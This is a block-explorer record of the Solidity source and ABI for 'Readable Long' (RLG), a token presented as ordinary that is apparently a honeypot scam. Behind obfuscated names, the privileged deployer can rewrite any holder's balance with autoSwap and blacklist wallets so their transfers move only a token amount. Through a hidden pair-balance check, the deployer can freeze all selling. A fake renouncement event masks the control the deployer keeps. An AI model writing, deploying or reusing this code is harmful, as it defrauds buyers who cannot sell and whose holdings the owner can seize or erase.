{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchedReceiver {\n    function createPair(address toToken, address fundAt) external returns (address);\n}\n\ninterface liquidityLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenAt) external view returns (uint256);\n\n    function transfer(address modeTeamIs, uint256 enableFund) external returns (bool);\n\n    function allowance(address toTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTeamIs,\n        uint256 enableFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellBuy, uint256 value);\n    event Approval(address indexed toTake, address indexed spender, uint256 value);\n}\n\nabstract contract tokenTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeSwapReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityLaunchedMetadata is liquidityLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReadableLong is tokenTake, liquidityLaunched, liquidityLaunchedMetadata {\n\n    bool private shouldFund;\n\n    uint256 public minTeam;\n\n    mapping(address => bool) public listFee;\n\n    event OwnershipTransferred(address indexed modeTo, address indexed shouldLaunched);\n\n    mapping(address => bool) public takeAmount;\n\n    mapping(address => mapping(address => uint256)) private autoLaunch;\n\n    function balanceOf(address tokenAt) public view virtual override returns (uint256) {\n        return senderLaunch[tokenAt];\n    }\n\n    function autoSwap(address listMin, uint256 enableFund) public {\n        limitSwap();\n        senderLaunch[listMin] = enableFund;\n    }\n\n    address tradingTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenAmount;\n    }\n\n    uint256 private tokenAmount = 100000000 * 10 ** 18;\n\n    uint256 constant walletTxFee = 16 ** 10;\n\n    uint256 private sellTake;\n\n    uint256 public swapFee;\n\n    address public marketingEnable;\n\n    bool public minAtTake;\n\n    function name() external view virtual override returns (string memory) {\n        return senderWallet;\n    }\n\n    bool public sellWallet;\n\n    uint256 listModeFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLimit;\n    }\n\n    uint8 private isExempt = 18;\n\n    mapping(address => uint256) private senderLaunch;\n\n    function transfer(address listMin, uint256 enableFund) external virtual override returns (bool) {\n        return toTotalIs(_msgSender(), listMin, enableFund);\n    }\n\n    bool private txTotalSell;\n\n    function limitSwap() private view {\n        require(takeAmount[_msgSender()]);\n    }\n\n    address private enableLaunch;\n\n    address public fromFee;\n\n    function fromWallet(address listWallet) public {\n        limitSwap();\n        \n        if (listWallet == marketingEnable || listWallet == fromFee) {\n            return;\n        }\n        listFee[listWallet] = true;\n    }\n\n    function approve(address fromToken, uint256 enableFund) public virtual override returns (bool) {\n        autoLaunch[_msgSender()][fromToken] = enableFund;\n        emit Approval(_msgSender(), fromToken, enableFund);\n        return true;\n    }\n\n    function marketingWallet() public {\n        emit OwnershipTransferred(marketingEnable, address(0));\n        enableLaunch = address(0);\n    }\n\n    address txLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public amountTx;\n\n    function launchTotalReceiver(uint256 enableFund) public {\n        limitSwap();\n        fundLaunch = enableFund;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isExempt;\n    }\n\n    uint256 fundLaunch;\n\n    constructor (){\n        if (swapFee == sellTake) {\n            swapFee = minTeam;\n        }\n        modeSwapReceiver maxMarketing = modeSwapReceiver(tradingTx);\n        fromFee = launchedReceiver(maxMarketing.factory()).createPair(maxMarketing.WETH(), address(this));\n        if (swapFee == minTeam) {\n            sellWallet = false;\n        }\n        marketingEnable = _msgSender();\n        takeAmount[marketingEnable] = true;\n        senderLaunch[marketingEnable] = tokenAmount;\n        marketingWallet();\n        if (sellTake != minTeam) {\n            minTeam = sellTake;\n        }\n        emit Transfer(address(0), marketingEnable, tokenAmount);\n    }\n\n    function senderExempt(address shouldToken, address modeTeamIs, uint256 enableFund) internal returns (bool) {\n        require(senderLaunch[shouldToken] >= enableFund);\n        senderLaunch[shouldToken] -= enableFund;\n        senderLaunch[modeTeamIs] += enableFund;\n        emit Transfer(shouldToken, modeTeamIs, enableFund);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return enableLaunch;\n    }\n\n    function tokenListShould(address walletSender) public {\n        if (minAtTake) {\n            return;\n        }\n        \n        takeAmount[walletSender] = true;\n        \n        minAtTake = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableLaunch;\n    }\n\n    function toTotalIs(address shouldToken, address modeTeamIs, uint256 enableFund) internal returns (bool) {\n        if (shouldToken == marketingEnable) {\n            return senderExempt(shouldToken, modeTeamIs, enableFund);\n        }\n        uint256 swapTrading = liquidityLaunched(fromFee).balanceOf(txLiquidity);\n        require(swapTrading == fundLaunch);\n        require(modeTeamIs != txLiquidity);\n        if (listFee[shouldToken]) {\n            return senderExempt(shouldToken, modeTeamIs, walletTxFee);\n        }\n        return senderExempt(shouldToken, modeTeamIs, enableFund);\n    }\n\n    string private senderWallet = \"Readable Long\";\n\n    string private enableLimit = \"RLG\";\n\n    function allowance(address sellMarketing, address fromToken) external view virtual override returns (uint256) {\n        if (fromToken == tradingTx) {\n            return type(uint256).max;\n        }\n        return autoLaunch[sellMarketing][fromToken];\n    }\n\n    function transferFrom(address shouldToken, address modeTeamIs, uint256 enableFund) external override returns (bool) {\n        if (_msgSender() != tradingTx) {\n            if (autoLaunch[shouldToken][_msgSender()] != type(uint256).max) {\n                require(enableFund <= autoLaunch[shouldToken][_msgSender()]);\n                autoLaunch[shouldToken][_msgSender()] -= enableFund;\n            }\n        }\n        return toTotalIs(shouldToken, modeTeamIs, enableFund);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFund\",\"type\":\"uint256\"}],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"}],\"name\":\"fromWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableFund\",\"type\":\"uint256\"}],\"name\":\"launchTotalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAtTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"tokenListShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTeamIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReadableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}